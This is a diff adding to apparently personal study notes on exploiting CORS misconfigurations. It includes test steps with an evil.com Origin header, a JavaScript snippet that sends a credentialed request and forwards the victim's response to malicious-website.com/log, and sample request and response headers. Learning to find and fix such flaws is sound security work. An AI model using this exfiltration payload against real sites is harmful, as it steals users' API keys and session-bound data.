@@ -23,3 +23,40 @@ Check for "Access-Control-Allow-Credentials" agar ye hai to CORS is there
      2. Change the Origin header to https://evil.com ( Origin : https://evil.com )
      3. Send the request and check the response for Access-Control-Allow-Origin: https://evil.com
      4. Craft the payload and send to exploit server and access the api key from access logs.
+
+------------------------------------------------------------------------------------------------------------------------------
+
+These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.
+
+Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. 
+If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='//malicious-website.com/log?key='+this.responseText;
+};
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. 
+If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. For example, the application receives a normal request like:
+
+REQUEST:- 
+
+Host: normal-website.com
+...
+Origin: https://innocent-website.com
+
+RESPONSE:-  (If this response comes then it's CORS vulnerability)
+
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://innocent-website.com
+
+
+------------------------------------------------------------------------------------------------------------------------------------
